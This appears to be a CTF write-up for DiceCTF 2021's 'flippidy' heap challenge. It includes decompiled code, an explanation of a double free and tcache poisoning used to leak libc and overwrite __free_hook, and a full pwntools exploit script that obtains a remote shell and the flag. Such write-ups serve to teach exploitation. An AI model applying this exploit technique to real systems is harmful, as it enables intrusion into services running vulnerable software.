class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_401254</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">0x14</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)atoi(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"To get started, first tell us how big your notebook will be: "</span>);</span><br><span class="line">firstRead_404150 = sub_401254();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>sub_4011c6</code> will print the menu with the options to operate on the notebook, note that the strings are present in a global variable at <code>0x404020</code>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4011C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    result = <span class="built_in">puts</span>(off_404020[i]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"> ...</span><br><span class="line"> <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4011C6();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">": "</span>);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p><p>A very important thing to refer that offsets at <code>0x404020</code> contains pointers (we can use this later if we manage to get an arbitrary write to leak libc):</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000404020</span> off_404020      dq offset aMenu         ; DATA XREF: sub_4011C6+<span class="number">2</span>A↑o</span><br><span class="line">.data:<span class="number">0000000000404020</span>                                         ; <span class="string">"----- Menu -----"</span></span><br><span class="line">.data:<span class="number">0000000000404028</span>                 dq offset a1AddToYourNote ; <span class="string">"1. Add to your notebook"</span></span><br><span class="line">.data:<span class="number">0000000000404030</span>                 dq offset a2FlipYourNoteb ; <span class="string">"2. Flip your notebook!"</span></span><br><span class="line">.data:<span class="number">0000000000404038</span>                 dq offset a3Exit        ; <span class="string">"3. Exit"</span></span><br><span class="line">.data:0000000000404040 aMenu           db '----- Menu -----',0 ; DATA XREF: .data:off_404020↑o</span><br></pre></td></tr></table></figure><h3 id="Add-to-your-notebook"><a href="#Add-to-your-notebook" class="headerlink" title="Add to your notebook"></a>Add to your notebook</h3><p>We can add new notes with option 1, the size is limited to 0x30.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4012D0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  v2 = sub_401254();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= firstRead_404150 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid index."</span>);</span><br><span class="line">  v1 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)qword_404158 + <span class="number">8</span> * v2);</span><br><span class="line">  *v1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int64)fgets(*((<span class="keyword">char</span> **)qword_404158 + v2), <span class="number">0x30</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flip-function"><a href="#Flip-function" class="headerlink" title="Flip function"></a>Flip function</h3><p>Flip function will exchange the position of the notes hence the name flipping, in the end it frees the old notes and mallocs the new ones by copping their contents with strcpy.</p><p>For example if the notebook has 2 notes this how it works:</p><ul><li><code>strcpy</code> the contents of 1st note to <code>s</code>.</li><li>Frees 1st note.</li><li><code>strcpy</code> the content of 2nd note to <code>dest</code>.</li><li>Frees 2nd note.</li><li><code>malloc</code> and store this new chunk at the position of the 2nd note and <code>strcpy</code> the content of the 1st note <code>s</code>.</li><li><code>malloc</code> and store this new chunk at the position of the 1st note and <code>strcpy</code> the content of the 2nd note <code>dest</code>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_401378</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> **v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+Ah] [rbp-A6h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-A5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+50h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= firstRead_404150 / <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)qword_404158 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;s, *((<span class="keyword">const</span> <span class="keyword">char</span> **)qword_404158 + i));</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="keyword">void</span> **)qword_404158 + i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)qword_404158 + firstRead_404150 - i - <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;dest, *((<span class="keyword">const</span> <span class="keyword">char</span> **)qword_404158 + firstRead_404150 - i - <span class="number">1</span>));</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="keyword">void</span> **)qword_404158 + firstRead_404150 - i - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_QWORD *)qword_404158 + i) = <span class="number">0L</span>L;</span><br><span class="line">    *((_QWORD *)qword_404158 + firstRead_404150 - i - <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)qword_404158 + <span class="number">8</span> * (firstRead_404150 - i) - <span class="number">8</span>);</span><br><span class="line">      *v0 = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">      <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)qword_404158 + firstRead_404150 - i - <span class="number">1</span>), &amp;s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)qword_404158 + firstRead_404150 - i - <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)qword_404158 + <span class="number">8</span> * i);</span><br><span class="line">      *v1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">      <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)qword_404158 + i), &amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)qword_404158 + i) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Getting-a-leak"><a href="#Getting-a-leak" class="headerlink" title="Getting a leak"></a>Getting a leak</h3><p>To get a leak we first need to find a way to get an <strong>arbitrary write</strong>, we know that the pointers to the strings of the menu are present at a global variable at <code>0x404020</code> if we can manage to change this pointer to a <strong>GOT address</strong> we can <strong>leak</strong> a libc address.</p><p>What happens if we run the flip function when the size of the notebook only has <strong>1</strong> note ?</p><p>The <strong>1st</strong> note will be also the <strong>last</strong> note! because of this we will have a double free! and at the same time we will <strong>corrupt</strong> the next pointer of the <strong>tcachebin[0x40]</strong> list to the value we want!</p><p>Visually this is what happens:<br><a data-fancybox="gallery" href="https://i.imgur.com/gEkVcNY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/gEkVcNY.png" alt><br></a><br>Source code to achieve this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">r = getConn()</span><br><span class="line">r.sendlineafter(<span class="string">'To get started, first tell us how big your notebook will be: '</span>, str(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0</span>, p64(<span class="number">0x404020</span>))</span><br><span class="line">flip() <span class="comment"># Triggers double free</span></span><br></pre></td></tr></table></figure><p>Next malloc will overwrite data in <strong>0x402020</strong> which contains the pointers of the <strong>MENU</strong>, if we change them to a GOT address we will leak libc in the next menu print of the loop.</p><p>The tcache bin list is looking like this right now:</p><p><strong>0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2d</strong></p><p>We have enough bytes to overwrite the 3rd item of the list at <strong>0x404040</strong> we can easily poison this tcache bin by changing it to <strong>0x404158</strong>.</p><p><strong>0x404158</strong> address is important because it contains the pointer of the first note of the notebook, if we control this value we will be able to write anywhere.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2d</span></span><br><span class="line">add(<span class="number">0</span>,p64(elf.got[<span class="string">'fgets'</span>])*<span class="number">4</span>+p64(<span class="number">0x404158</span>))</span><br><span class="line">FGETS = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">LIBC = FGETS-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_SHOT = LIBC+<span class="number">0x4f322</span></span><br><span class="line">log.info(<span class="string">"FGETS 0x%x"</span> % FGETS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br></pre></td></tr></table></figure><h3 id="Getting-a-shell"><a href="#Getting-a-shell" class="headerlink" title="Getting a shell"></a>Getting a shell</h3><p>Now that we have libc we just need to overwrite <strong>malloc_hook</strong> or <strong>free_hook</strong> to one_gadget to get a shell.</p><p>After our last malloc the tcachebin is looking like this:<br><strong>0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; …</strong></p><ul><li><p>1st malloc and setting <strong>0xdeadbeef</strong> as input, the list will look like this:<br><strong>0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</strong></p></li><li><p>2nd malloc and setting p64(LIBC+libc.symbols[‘__free_hook’]) as input:<br><strong>0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</strong></p></li><li><p>3rd malloc and setting <strong>0xdeadbeef</strong> as input:<br><strong>0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</strong></p></li><li><p>4th malloc and setting p64(LIBC+libc.symbols[‘__free_hook’]) as input:<br><strong>FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; …</strong></p></li></ul><p>Next malloc will write into <strong>FREE_HOOK</strong>, with that we can easily fill it with <strong>one_gadget</strong> address.</p><p>The python code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># 0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(ONE_SHOT)) <span class="comment"># Sets FREE_HOOK to ONE_SHOT</span></span><br></pre></td></tr></table></figure></p><p>Triggering free to get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flip() <span class="comment"># Triggers free_hook and gets ourselves a shell</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>The entire script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"dicec.tf"</span>, <span class="string">"31904"</span></span><br><span class="line">filename = <span class="string">"./flippidy"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">FREE = [<span class="number">0x4014D2</span>,<span class="number">0x401444</span>]</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'To get started, first tell us how big your notebook will be: '</span>, str(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0</span>, p64(<span class="number">0x404020</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x40132F</span>]+FREE)</span><br><span class="line">flip() <span class="comment"># Triggers double free</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2d</span></span><br><span class="line">add(<span class="number">0</span>,p64(elf.got[<span class="string">'fgets'</span>])*<span class="number">4</span>+p64(<span class="number">0x404158</span>))</span><br><span class="line">FGETS = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">LIBC = FGETS-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_SHOT = LIBC+<span class="number">0x4f322</span></span><br><span class="line">log.info(<span class="string">"FGETS 0x%x"</span> % FGETS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># 0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(ONE_SHOT)) <span class="comment"># Sets FREE_HOOK to ONE_SHOT</span></span><br><span class="line"></span><br><span class="line">flip() <span class="comment"># Triggers free_hook and gets ourselves a shell</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running the script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python flippidy.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/flippidy/flippidy'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/flippidy/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to dicec.tf on port 31904: Done</span><br><span class="line">[*] FGETS 0x7fb4d2848b20</span><br><span class="line">[*] LIBC 0x7fb4d27ca000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">challenge</span><br><span class="line">flag.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">dice&#123;some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;flippidy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Solves&lt;/strong&gt;: 62&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 149   &lt;/p&gt;
&lt;p&gt;&lt;strong
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"/>
    
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/tags/tcache-poisoning/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="dicectf2021" scheme="https://teamrocketist.github.io/tags/dicectf2021/"/>
    
  </entry>
  
  <entry>
